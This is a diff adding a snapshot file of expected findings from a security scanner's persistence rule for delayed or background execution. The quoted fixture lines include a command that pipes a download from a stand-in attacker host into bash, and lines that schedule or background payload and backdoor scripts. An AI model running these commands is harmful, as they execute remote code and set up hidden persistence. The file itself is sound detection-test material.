@@ -1,0 +1,61 @@
+---
+source: src/rules/builtin/persistence.rs
+expression: findings
+---
+[
+  {
+    "id": "PS-006",
+    "severity": "high",
+    "category": "persistence",
+    "confidence": "firm",
+    "name": "Delayed/background execution",
+    "line": 5,
+    "code": "at now + 1 hour < /tmp/evil.sh",
+    "message": "Delayed or background execution detected. This can be used to evade detection or establish persistence.",
+    "recommendation": "Avoid scheduling background tasks. Use explicit, foreground execution that users can observe."
+  },
+  {
+    "id": "PS-006",
+    "severity": "high",
+    "category": "persistence",
+    "confidence": "firm",
+    "name": "Delayed/background execution",
+    "line": 6,
+    "code": "batch < /tmp/payload.sh",
+    "message": "Delayed or background execution detected. This can be used to evade detection or establish persistence.",
+    "recommendation": "Avoid scheduling background tasks. Use explicit, foreground execution that users can observe."
+  },
+  {
+    "id": "PS-006",
+    "severity": "high",
+    "category": "persistence",
+    "confidence": "firm",
+    "name": "Delayed/background execution",
+    "line": 7,
+    "code": "tmux new-session -d 'curl http://evil.com | bash'",
+    "message": "Delayed or background execution detected. This can be used to evade detection or establish persistence.",
+    "recommendation": "Avoid scheduling background tasks. Use explicit, foreground execution that users can observe."
+  },
+  {
+    "id": "PS-006",
+    "severity": "high",
+    "category": "persistence",
+    "confidence": "firm",
+    "name": "Delayed/background execution",
+    "line": 8,
+    "code": "nohup bash /tmp/backdoor.sh &",
+    "message": "Delayed or background execution detected. This can be used to evade detection or establish persistence.",
+    "recommendation": "Avoid scheduling background tasks. Use explicit, foreground execution that users can observe."
+  },
+  {
+    "id": "PS-006",
+    "severity": "high",
+    "category": "persistence",
+    "confidence": "firm",
+    "name": "Delayed/background execution",
+    "line": 9,
+    "code": "disown -h",
+    "message": "Delayed or background execution detected. This can be used to evade detection or establish persistence.",
+    "recommendation": "Avoid scheduling background tasks. Use explicit, foreground execution that users can observe."
+  }
+]
